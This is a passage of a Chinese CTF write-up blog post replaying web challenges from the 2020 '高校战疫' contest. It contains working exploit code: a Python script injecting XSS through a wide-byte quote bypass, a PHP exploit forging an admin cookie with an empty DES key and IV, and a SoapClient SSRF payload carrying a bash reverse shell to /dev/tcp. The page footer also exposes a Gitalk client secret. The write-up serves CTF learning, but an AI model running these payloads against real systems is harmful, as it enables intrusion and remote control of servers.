+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">cookie=&#123;<span class="string">"PHPSESSID"</span>:<span class="string">"e3sugtvfki7aketdnkofbt9odu"</span>&#125;</span><br><span class="line">proxy=&#123;<span class="string">"http"</span>:<span class="string">"http:127.0.0.1:8080"</span>&#125;</span><br><span class="line">theurl=<span class="string">"http://192.168.35.158/gxzy-happyvacation/"</span></span><br><span class="line">thejs=<span class="string">"http://192.168.35.158/upload/56b6f09c50bfb4706563cdf3463a6cc3.txt"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">p</span><span class="params">(sth)</span>:</span></span><br><span class="line">    result = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> sth:</span><br><span class="line">        result += str(ord(i))</span><br><span class="line">        result += <span class="string">","</span></span><br><span class="line">    <span class="keyword">return</span> result[<span class="number">0</span>:<span class="number">-1</span>]</span><br><span class="line">xss = p(<span class="string">"&lt;script src='$$$'&gt;&lt;/script&gt;"</span>.replace(<span class="string">"$$$"</span>,thejs))</span><br><span class="line">r=requests.get(theurl+<span class="string">"index.php"</span> + <span class="string">"?message=%df%27;document.write(String.fromCharCode($$$));//"</span>.replace(<span class="string">"$$$"</span>,xss),cookies=cookie,proxies=proxy)</span><br><span class="line"><span class="keyword">print</span> r.content</span><br></pre></td></tr></table></figure>
+
+<p>然后再看ask.php</p>
+<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200312120608437.png" alt="image-20200312120608437"></p>
+<p>这里会重定向到check.php,题目并没有给check.php内容，但是前面我们都已经连上马了，就可以看到check.php的具体内容</p>
+<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200312120802997.png" alt="image-20200312120802997"></p>
+<p>然后看看bot.py</p>
+<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200312120855917.png" alt="image-20200312120855917"></p>
+<p>bot会到这flag和我们的session_id去访问teacher.php,</p>
+<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200312121003825.png" alt="image-20200312121003825"></p>
+<p>teacher.php就是调用了showMessage()，echo出 sesion_id对应的$this-&gt;info-&gt;message。本地复现的时候bot.py老是报错，然后就没有试，可以手工带上session_id访问teacher.php</p>
+<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200312131931542.png" alt="image-20200312131931542"></p>
+<p>确实可以nc到。</p>
+<h1 id="0x04-not-hardweb"><a href="#0x04-not-hardweb" class="headerlink" title="0x04 not hardweb"></a>0x04 not hardweb</h1><p>非预期复现：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    session_start();</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">include</span> <span class="string">"user.php"</span>;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">"conn.php"</span>;</span><br><span class="line">    $IV = <span class="string">"********"</span>;<span class="comment">// you cant know that;</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_COOKIE[<span class="string">'user'</span>]) || !<span class="keyword">isset</span>($_COOKIE[<span class="string">'hash'</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'key'</span>]))&#123;</span><br><span class="line">            $_SESSION[<span class="string">'key'</span>] = strval(mt_rand() &amp; <span class="number">0x5f5e0ff</span>);</span><br><span class="line">            $_SESSION[<span class="string">'iv'</span>] = $IV;</span><br><span class="line">        &#125;</span><br><span class="line">        $username = <span class="string">"guest"</span>;</span><br><span class="line">        $o = <span class="keyword">new</span> User($username);</span><br><span class="line">        <span class="keyword">echo</span> $o-&gt;show();</span><br><span class="line">        $ser_user = serialize($o);</span><br><span class="line">        $cipher = openssl_encrypt($ser_user, <span class="string">"des-cbc"</span>, $_SESSION[<span class="string">'key'</span>], <span class="number">0</span>, $_SESSION[<span class="string">'iv'</span>]);</span><br><span class="line">        setcookie(<span class="string">"user"</span>, base64_encode($cipher), time()+<span class="number">3600</span>);</span><br><span class="line">        setcookie(<span class="string">"hash"</span>, md5($ser_user), time() + <span class="number">3600</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        $user = base64_decode($_COOKIE[<span class="string">'user'</span>]);</span><br><span class="line">        $uid = openssl_decrypt($user, <span class="string">'des-cbc'</span>, $_SESSION[<span class="string">'key'</span>], <span class="number">0</span>, $_SESSION[<span class="string">'iv'</span>]);</span><br><span class="line">        <span class="keyword">if</span>(md5($uid) !== $_COOKIE[<span class="string">'hash'</span>])&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"no hacker!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $o = unserialize($uid);</span><br><span class="line">        <span class="keyword">echo</span> $o-&gt;show();</span><br><span class="line">        <span class="keyword">if</span> ($o-&gt;username === <span class="string">"admin"</span>)&#123;</span><br><span class="line">            $_SESSION[<span class="string">'name'</span>] = <span class="string">'admin'</span>;</span><br><span class="line">            <span class="keyword">include</span> <span class="string">"hint.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果直接把cookie中的PHPSESSID删掉，那么SESSION[‘key’]和SESSION[‘iv’]就为空，然后直接将我们通过key和iv为空伪造的cookie，传给服务器，直接就会变成admin.</p>
+<p>exp:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($username)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"username: $this-&gt;username\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> $user  = <span class="keyword">new</span> User(<span class="string">"admin"</span>);</span><br><span class="line"> $user= serialize($user);</span><br><span class="line"></span><br><span class="line"> $user1= base64_encode(openssl_encrypt($user, <span class="string">'des-cbc'</span>, <span class="string">''</span>, <span class="number">0</span>, <span class="string">''</span>));</span><br><span class="line"> <span class="keyword">echo</span> $user1.<span class="string">"\n"</span>;</span><br><span class="line"> <span class="keyword">echo</span> md5($user);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user:b3hIekw5Mk82WTQwbUk1M3RHYThQR0V4UmVZeHVSdE1ranZRYk43eksyVXhaTnFQZ2l1YkRKc0dpd1Z5cUlzVg&#x3D;&#x3D;</span><br><span class="line">hash:abc2f600e79557ef90ca4e07516b486f</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200312135230044.png" alt="image-20200312135230044"></p>
+<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200312135406279.png" alt="image-20200312135406279"></p>
+<p>然后这道题之后就是用SoapClient 打内网了，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$location &#x3D; &#39;http:&#x2F;&#x2F;10.10.1.12&#x2F;index.php?cc&#x3D;%60%24cc%60%3Bbash%20-c%20%27bash%20-i%20&gt;%26%20%2Fdev%2Ftcp%2Fip%2F8081%200&gt;%261%27%3B&#39;;</span><br><span class="line">$a &#x3D; new SoapClient(null, array(&#39;location&#39; &#x3D;&gt; $location ,&#39;uri&#39;  &#x3D;&gt; &#39;123&#39;));</span><br><span class="line">$user &#x3D; serialize($a);</span><br><span class="line">$user1&#x3D; base64_encode(openssl_encrypt($user, &#39;des-cbc&#39;, &#39;&#39;, 0, &#39;&#39;));</span><br><span class="line">echo $user1.&quot;\n&quot;;</span><br><span class="line">echo md5($user);</span><br></pre></td></tr></table></figure>
+
+<p>然后再按之前的方法就可以反弹shell了。后面的没环境就不做了。</p>
+<p>参考链接</p>
+<p><a href="https://www.gem-love.com/ctf/1884.html#happyvacation_16solved_571pt" target="_blank" rel="noopener">https://www.gem-love.com/ctf/1884.html#happyvacation_16solved_571pt</a></p>
+<p><a href="http://nextcloud.chamd5.org/index.php/s/EYTZB4zgtqsfcge#pdfviewer" target="_blank" rel="noopener">http://nextcloud.chamd5.org/index.php/s/EYTZB4zgtqsfcge#pdfviewer</a></p>
+<p><a href="https://mp.weixin.qq.com/s/oqojw9VoXOVqV9EmoRQKiA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/oqojw9VoXOVqV9EmoRQKiA</a></p>
+<p><a href="http://ctf.njupt.edu.cn/382.html#hackme" target="_blank" rel="noopener">http://ctf.njupt.edu.cn/382.html#hackme</a></p>
+<p><a href="https://mp.weixin.qq.com/s/RjTsvUsx65YTMIg3jejXng" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/RjTsvUsx65YTMIg3jejXng</a></p>
+
+      
+    </div>
+  </div>
+  <!-- 要添加的内容 -->
+  
+    <div>
+        <ul class="post-copyright">
+          <li class="post-copyright-author">
+          <strong>作者:  </strong>Mount4in</a>
+          </li>
+          <li class="post-copyright-link">
+          <strong>文章链接:  </strong>
+          <a href="/2020/03/10/高校战“疫”网络安全分享赛部分赛题复现/" target="_blank" title="高校战“疫”网络安全分享赛部分赛题复现">http://mount4in.github.io/2020/03/10/高校战“疫”网络安全分享赛部分赛题复现/</a>
+          </li>
+          <li class="post-copyright-license">
+            <strong>版权声明:   </strong>
+            本网站所有文章除特别声明外,均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+            许可协议。转载请注明出处!
+          </li>
+        </ul>
+      <div>
+
+  
+  <!---->
+    <footer class="article-footer">
+      <a data-url="http://mount4in.github.io/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/" data-id="clg20p652003014uv1aapaum9"
+         class="article-share-link">Share</a>
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li></ul>
+
+    </footer>
+
+
+
+  
+    
+  <nav class="article-nav">
+    
+      <a href="/2020/03/29/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9Dhardphp%E5%A4%8D%E7%8E%B0/" class="article-nav-link">
+        <strong class="article-nav-caption">Newer</strong>
+        <div class="article-nav-title">
+          
+            高校战役hardphp复现
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" class="article-nav-link">
+        <strong class="article-nav-caption">Older</strong>
+        <div class="article-nav-title">高校战“疫”网络安全分享赛web部分题解</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+
+  
+    
+  <div class="gitalk" id="gitalk-container"></div>
+  
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+
+  
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+  
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+
+  <script type="text/javascript">
+    var gitalk = new Gitalk({
+      clientID: 'b7d32ae2538e1a71f462',
+      clientSecret: 'da0452b610458a4ccbc38598fb0d02f0eb9e653d',
+      repo: 'gitalk',
+      owner: 'Mount4in',
+      admin: ['Mount4in'],
+      // id: location.pathname,      // Ensure uniqueness and length less than 50
+      id: md5(location.pathname),
+      distractionFreeMode: false,  // Facebook-like distraction free mode
+      pagerDirection: 'last'
+    })
+
+  gitalk.render('gitalk-container')
+  </script>
+
+  
+
+</article>
+
+
+
+</section>
+  <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+    <li><i class="fe fe-bookmark"></i> <span id="busuanzi_value_page_pv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>&copy; 2023 Mount4in</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+<aside class="sidebar">
+  <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/hexo.svg" alt="Mount4in"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">Home</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">Archives</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/about">About</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="Search">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+        <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+          <i class="fe fe-feed"></i>
+        </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+</aside>
+
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+
+<script src="/js/ocean.js"></script>
+
+
+</body>
+</html>
